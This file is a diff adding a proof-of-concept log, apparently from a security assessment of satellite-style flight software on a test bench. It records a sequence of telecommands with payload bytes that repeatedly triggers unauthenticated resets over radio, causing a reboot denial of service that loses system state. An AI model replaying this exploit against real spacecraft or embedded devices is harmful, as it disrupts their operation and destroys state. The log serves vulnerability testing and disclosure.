@@ -1,0 +1,83 @@
+[   0.000] ========================================================================
+[   0.000] V-08 RESETC unauthenticated reboot-DoS
+[   0.000] ========================================================================
+[   1.519] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.851] --> TC apid=0x0A via=usb AES  payload=00
+[   8.903] <-- TM apid=0x0A clear len=3
+[   8.955] --> TC apid=0x1D via=usb clear payload=0101
+[   9.006] <-- TM apid=0x1D clear len=4
+[   9.006] --> TC apid=0x11 via=usb clear payload=00
+[   9.467] <-- TM apid=0x11 clear len=9
+[   9.467] --> TC apid=0x15 via=usb clear payload=001005
+[   9.917] <-- TM apid=0x15 clear len=6
+[   9.917] --> TC apid=0x0D via=usb clear payload=01
+[  10.368] <-- TM apid=0x0D clear len=4
+[  10.409] --> TC apid=0x1D via=usb clear payload=03
+[  10.461] <-- TM apid=0x1D clear len=4
+[  10.461] <-- TM apid=0x09 clear len=9
+[  10.513] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.565] <-- TM apid=0x1D clear len=4
+[  10.565] --> TC apid=0x10 via=usb clear payload=00
+[  10.617] <-- TM apid=0x10 clear len=4
+[  10.617] --> TC apid=0x21 via=usb clear payload=00
+[  11.067] <-- TM apid=0x21 clear len=6
+[  11.067] --> TC apid=0x24 via=usb clear payload=0000
+[  11.118] <-- TM apid=0x24 clear len=8
+[  11.118] --> TC apid=0x24 via=usb clear payload=0100
+[  11.170] <-- TM apid=0x24 clear len=8
+[  11.170] --> TC apid=0x24 via=usb clear payload=0200
+[  11.212] <-- TM apid=0x24 clear len=8
+[  11.212] --> TC apid=0x24 via=usb clear payload=0300
+[  11.264] <-- TM apid=0x24 clear len=8
+[  11.264] --> TC apid=0x25 via=usb clear payload=0080
+[  11.315] <-- TM apid=0x25 clear len=4
+[  11.315] --> TC apid=0x1E via=usb clear payload=01
+[  11.827] <-- TM apid=0x1E clear len=5
+[  11.827] --> TC apid=0x1D via=usb clear payload=0b
+[  11.920] <-- TM apid=0x1D clear len=4
+[  11.920] --> TC apid=0x05 via=usb clear payload=12
+[  12.380] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.881] <-- TM apid=0x1F clear len=4
+[  12.881] --> TC apid=0x1F via=usb clear payload=05
+[  13.383] <-- TM apid=0x1F clear len=4
+[  13.383] --> TC apid=0x0A via=usb clear payload=01
+[  13.424] <-- TM apid=0x0A AES len=3
+[  21.523] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  30.001] <-- TM apid=0x0E AES len=18
+[  30.001] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.064] --> TC apid=0x02 via=radio AES  payload=-
+[  33.692] <-- TM apid=0x02 clear len=4
+[  33.692] --> advance(1000 ms)
+[  39.601] --> REARM (bench parity: board rebooted mid-session)
+[  39.653] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  48.127] <-- TM apid=0x0E AES len=18
+[  49.152] <-- TM apid=0x27 clear len=4
+[  49.152] --> TC apid=0x01 via=radio AES  payload=-
+[  49.206] <-- TM apid=0x01 AES len=5
+[  49.206] reset #1 issued from raw radio; craft back: True (boot count was 0)
+[  49.258] --> TC apid=0x02 via=radio AES  payload=-
+[  52.928] <-- TM apid=0x02 clear len=4
+[  52.928] --> advance(1000 ms)
+[  53.949] --> TC apid=0x01 via=radio AES  payload=-
+[  55.791] --> REARM (bench parity: board rebooted mid-session)
+[  55.842] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  64.315] <-- TM apid=0x0E AES len=18
+[  64.337] <-- TM apid=0x01 AES len=5
+[  64.337] reset #2 issued from raw radio; craft back: True (boot count was 1)
+[  64.389] --> TC apid=0x02 via=radio AES  payload=-
+[  68.068] <-- TM apid=0x02 clear len=4
+[  68.068] --> advance(1000 ms)
+[  73.924] --> REARM (bench parity: board rebooted mid-session)
+[  73.976] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  82.455] <-- TM apid=0x0E AES len=18
+[  83.480] <-- TM apid=0x27 clear len=4
+[  83.481] --> TC apid=0x01 via=radio AES  payload=-
+[  83.534] <-- TM apid=0x01 AES len=5
+[  83.534] reset #3 issued from raw radio; craft back: True (boot count was 2)
+[  83.534] --> TC apid=0x0C via=usb AES  payload=-
+[  83.578] <-- TM apid=0x0C AES len=27
+[  83.578] mode after resets: 0x01 (NOMINAL again, state lost)
+[  83.579] -- console tail: [INFO] BME OK | [INFO] GPS UART configured at 9600 baud | [INFO] Radio 0 Configured Successfully! | [INFO] Radio 1 Configured Successfully! | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [WARN] GPS not detected on UART, using zero-coordinate fallback | [TC - SPP] APID=0x027 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x014 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x001 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00C SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO
+[  83.579] ========================================================================
+[  83.579] POC OK
+[  83.579] ========================================================================
